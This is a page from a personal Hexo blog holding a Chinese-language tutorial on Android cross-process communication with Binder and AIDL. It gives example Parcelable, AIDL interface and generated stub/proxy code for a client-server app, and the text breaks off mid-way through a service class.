<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="BruceFan&#39;s Blog">
<meta property="og:url" content="http://example.com/page/7/index.html">
<meta property="og:site_name" content="BruceFan&#39;s Blog">
<meta property="og:locale">
<meta property="article:author" content="Bruce Fan">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/7/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-Hans'
  };
</script>

  <title>BruceFan's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">BruceFan's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Stay hungry, stay foolish</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="http://example.com/2017/05/10/Android%E8%B7%A8%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%92%8CAIDL/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Bruce Fan">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/05/10/Android%E8%B7%A8%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E5%92%8CAIDL/" class="post-title-link" itemprop="url">Android跨进程通信——远程调用过程和AIDL</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-05-10 23:58:27" itemprop="dateCreated datePublished" datetime="2017-05-10T23:58:27+08:00">2017-05-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>Android设计理念强调组件化，组件之间的依赖性很小。我们发送一个intent请求可以做到：</p>
<ul>
<li>启动另一个应用的Activity</li>
<li>启动某一个进程的Service</li>
<li>可以注册一个广播，只要有这个事件发生你都可以收到</li>
<li>可以查询一个Content Provider获得你想要的数据</li>
</ul>
<p>这其实都需要跨进程通信（IPC）的支持，只是Android将其封装的如此简单，应用开发者甚至完全不用关注它是不是和我在一个进程里。Android中的IPC是通过Binder实现的，本文主要介绍跨进程调用的过程和AIDL，下一篇介绍Binder实现机制。</p>
<blockquote>
<p>Binder并不是android最早开始使用，它发源于Be和Palm之前的OpenBinder，由Dianne Hackborn领导开发。Hackborn现在就在google，是android framework的工程师，我们可以从<a target="_blank" rel="noopener" href="https://lkml.org/lkml/2009/6/25/3">https://lkml.org/lkml/2009/6/25/3</a> 看一下，Hackborn如何描述binder。一句话总结：<br>In the Android platform, the binder is used for nearly everything that<br>happens across processes in the core platform.</p>
</blockquote>
<p>Android将Binder封装的几乎不可见，层次结构如下图：<br><img src="/images/binder/levels.png"><br>最底层的是Android的<code>ashmen（Anonymous shared memory）</code>机制，它负责辅助实现内存的分配，以及跨进程所需要的内存共享。<br><code>AIDL（android interface definition language）</code>对Binder的使用进行了封装，可以让开发者方便的进行方法的远程调用，后面会详细介绍。<br>Intent是最高一层的抽象，方便开发者进行常用的跨进程调用。<br>使用Intent跨进程启动一个Activity或者Service是Android中非常基础的内容，这里就不再介绍了。<br>这里讲一下实现远程的方法调用。在Android中对方法的远程调用无处不在，随便打开<code>framework/base</code>中的包，都会发现很多AIDL文件。AIDL是Android为了方便开发者进行远程方法调用，定义的一种语言。使用AIDL完成一个远程方法调用只需要三个步骤：</p>
<ul>
<li>用AIDL定义需要被调用方法接口；</li>
<li>实现这些方法；</li>
<li>调用这些方法。</li>
</ul>
<h2 id="一个远程调用的例子"><a href="#一个远程调用的例子" class="headerlink" title="一个远程调用的例子"></a>一个远程调用的例子</h2><p>这个例子由两个APP组成，一个服务端，一个客户端，客户端向服务端远程（跨进程）请求数据。</p>
<h3 id="服务端程序实现"><a href="#服务端程序实现" class="headerlink" title="服务端程序实现"></a>服务端程序实现</h3><p>这里我是用Android Studio进行开发的，用的不太熟练，这里也记录一下。<br><img src="/images/binder/server.png"><br>服务端的MainActivity没有什么用，不需要编写。首先，写一个要远程传递的数据类型：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Parcelable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Student&gt; CREATOR = <span class="keyword">new</span> Creator&lt;Student&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Student[] newArray(<span class="keyword">int</span> size) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Student[size];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Student <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Student(source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">(Parcel pl)</span> </span>&#123;</span><br><span class="line">        age = pl.readInt();</span><br><span class="line">        name = pl.readString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">describeContents</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>&#123;</span><br><span class="line">        dest.writeInt(age);</span><br><span class="line">        dest.writeString(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>要传递的数据类型不是基础类型，需要对其进行包装，成为Parcelable的实例。</p>
<blockquote>
<p>Student其实是一个JavaBean，JavaBean是使用Java语言开发的一个可重用组件。JavaBean必须实现可序列化接口，支持这个接口的对象可以存储和重建它们。JavaBean所有属性必须有对应的getter和setter方法。<br>AIDL支持的数据类型：String、Char、基本数据类型、List、Map、Parcelable</p>
</blockquote>
<p>接着新建两个AIDL文件，新建方法是：右键java目录下的包-&gt;New-&gt;AIDL-&gt;AIDL File。这样Android Studio会自动创建一个与java目录同级的aidl目录，aidl目录下有与java目录中相同的包，如上图所示。<br>新建一个<code>Student.aidl</code>文件：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.aidlserver;</span><br><span class="line">parcelable Student;</span><br></pre></td></tr></table></figure>
<p>这个文件是为了接口文件能找到Student类对象。<br>再新建一个服务的接口<code>IMyService.aidl</code>：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.aidlserver;</span><br><span class="line"><span class="keyword">import</span> com.example.aidlserver.Student;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">IMyService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function">Map <span class="title">getMap</span><span class="params">(in String test_class, in Student student)</span></span>;</span><br><span class="line">    <span class="function">Student <span class="title">getStudent</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看起来和Java没有什么区别，定义了两个接口方法。在Android Studio的菜单栏点击<code>Build-&gt;Make Project</code>后，会在上图的build目录中生成对应的<code>.java</code>文件，生成的代码如下：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This file is auto-generated.  DO NOT MODIFY.</span></span><br><span class="line"><span class="comment"> * Original file: /Users/fan/Computer/Android/workspace/AIDLServer/app/src/main/aidl/com/example/aidlserver/IMyService.aidl</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> com.example.aidlserver;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">IMyService</span> <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">os</span>.<span class="title">IInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/** Local-side IPC implementation stub class. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Stub</span> <span class="keyword">extends</span> <span class="title">android</span>.<span class="title">os</span>.<span class="title">Binder</span> <span class="keyword">implements</span> <span class="title">com</span>.<span class="title">example</span>.<span class="title">aidlserver</span>.<span class="title">IMyService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> java.lang.String DESCRIPTOR = <span class="string">&quot;com.example.aidlserver.IMyService&quot;</span>;</span><br><span class="line"><span class="comment">/** Construct the stub at attach it to the interface. */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Stub</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">this</span>.attachInterface(<span class="keyword">this</span>, DESCRIPTOR);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Cast an IBinder object into an com.example.aidlserver.IMyService interface,</span></span><br><span class="line"><span class="comment"> * generating a proxy if needed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> com.example.aidlserver.<span class="function">IMyService <span class="title">asInterface</span><span class="params">(android.os.IBinder obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> ((obj==<span class="keyword">null</span>)) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR);</span><br><span class="line"><span class="keyword">if</span> (((iin!=<span class="keyword">null</span>)&amp;&amp;(iin <span class="keyword">instanceof</span> com.example.aidlserver.IMyService))) &#123;</span><br><span class="line"><span class="keyword">return</span> ((com.example.aidlserver.IMyService)iin);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> com.example.aidlserver.IMyService.Stub.Proxy(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> android.os.<span class="function">IBinder <span class="title">asBinder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTransact</span><span class="params">(<span class="keyword">int</span> code, android.os.Parcel data, android.os.Parcel reply, <span class="keyword">int</span> flags)</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (code)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> INTERFACE_TRANSACTION:</span><br><span class="line">&#123;</span><br><span class="line">reply.writeString(DESCRIPTOR);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> TRANSACTION_getMap:</span><br><span class="line">&#123;</span><br><span class="line">data.enforceInterface(DESCRIPTOR);</span><br><span class="line">java.lang.String _arg0;</span><br><span class="line">_arg0 = data.readString();</span><br><span class="line">com.example.aidlserver.Student _arg1;</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>!=data.readInt())) &#123;</span><br><span class="line">_arg1 = com.example.aidlserver.Student.CREATOR.createFromParcel(data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_arg1 = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">java.util.Map _result = <span class="keyword">this</span>.getMap(_arg0, _arg1);</span><br><span class="line">reply.writeNoException();</span><br><span class="line">reply.writeMap(_result);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> TRANSACTION_getStudent:</span><br><span class="line">&#123;</span><br><span class="line">data.enforceInterface(DESCRIPTOR);</span><br><span class="line">com.example.aidlserver.Student _result = <span class="keyword">this</span>.getStudent();</span><br><span class="line">reply.writeNoException();</span><br><span class="line"><span class="keyword">if</span> ((_result!=<span class="keyword">null</span>)) &#123;</span><br><span class="line">reply.writeInt(<span class="number">1</span>);</span><br><span class="line">_result.writeToParcel(reply, android.os.Parcelable.PARCELABLE_WRITE_RETURN_VALUE);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">reply.writeInt(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">super</span>.onTransact(code, data, reply, flags);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Proxy</span> <span class="keyword">implements</span> <span class="title">com</span>.<span class="title">example</span>.<span class="title">aidlserver</span>.<span class="title">IMyService</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">private</span> android.os.IBinder mRemote;</span><br><span class="line">Proxy(android.os.IBinder remote)</span><br><span class="line">&#123;</span><br><span class="line">mRemote = remote;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> android.os.<span class="function">IBinder <span class="title">asBinder</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> mRemote;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> java.lang.<span class="function">String <span class="title">getInterfaceDescriptor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> DESCRIPTOR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> java.util.<span class="function">Map <span class="title">getMap</span><span class="params">(java.lang.String test_class, com.example.aidlserver.Student student)</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">java.util.Map _result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">_data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">_data.writeString(test_class);</span><br><span class="line"><span class="keyword">if</span> ((student!=<span class="keyword">null</span>)) &#123;</span><br><span class="line">_data.writeInt(<span class="number">1</span>);</span><br><span class="line">student.writeToParcel(_data, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_data.writeInt(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">mRemote.transact(Stub.TRANSACTION_getMap, _data, _reply, <span class="number">0</span>);</span><br><span class="line">_reply.readException();</span><br><span class="line">java.lang.ClassLoader cl = (java.lang.ClassLoader)<span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">_result = _reply.readHashMap(cl);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">_reply.recycle();</span><br><span class="line">_data.recycle();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Override</span> <span class="keyword">public</span> com.example.aidlserver.<span class="function">Student <span class="title">getStudent</span><span class="params">()</span> <span class="keyword">throws</span> android.os.RemoteException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">android.os.Parcel _data = android.os.Parcel.obtain();</span><br><span class="line">android.os.Parcel _reply = android.os.Parcel.obtain();</span><br><span class="line">com.example.aidlserver.Student _result;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">_data.writeInterfaceToken(DESCRIPTOR);</span><br><span class="line">mRemote.transact(Stub.TRANSACTION_getStudent, _data, _reply, <span class="number">0</span>);</span><br><span class="line">_reply.readException();</span><br><span class="line"><span class="keyword">if</span> ((<span class="number">0</span>!=_reply.readInt())) &#123;</span><br><span class="line">_result = com.example.aidlserver.Student.CREATOR.createFromParcel(_reply);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">_result = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">_reply.recycle();</span><br><span class="line">_data.recycle();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _result;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TRANSACTION_getMap = (android.os.IBinder.FIRST_CALL_TRANSACTION + <span class="number">0</span>);</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TRANSACTION_getStudent = (android.os.IBinder.FIRST_CALL_TRANSACTION + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> java.util.<span class="function">Map <span class="title">getMap</span><span class="params">(java.lang.String test_class, com.example.aidlserver.Student student)</span> <span class="keyword">throws</span> android.os.RemoteException</span>;</span><br><span class="line"><span class="keyword">public</span> com.example.aidlserver.<span class="function">Student <span class="title">getStudent</span><span class="params">()</span> <span class="keyword">throws</span> android.os.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先这个接口继承了<code>android.os.IInterface</code>，它是所有由AIDL文件生成类的基类。接口中有一个内部类<code>Stub</code>，它继承自Binder并实现了这个生成的Java接口<code>IMyService</code>。但是它并没有实现我们定义的接口方法。而这些接口方法其实就是留给我们去实现的，新建一个<code>MyService</code>类：  </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent 